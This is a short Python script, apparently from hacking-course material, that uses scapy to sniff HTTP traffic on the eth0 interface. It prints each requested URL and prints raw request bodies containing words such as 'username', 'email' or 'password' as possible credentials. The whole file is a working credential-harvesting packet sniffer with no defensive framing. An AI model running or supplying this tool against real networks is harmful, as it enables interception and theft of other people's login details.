import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode("utf-8")


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')
        hooks = ["user", "username", "uname", "login", "email", "password", "pass"]
        if any(sub in load for sub in hooks):
            return load
    return None


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f'[+] HTTP Request >> {url}')
        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n[+] Possible username-password: {login_info}')


sniff("eth0")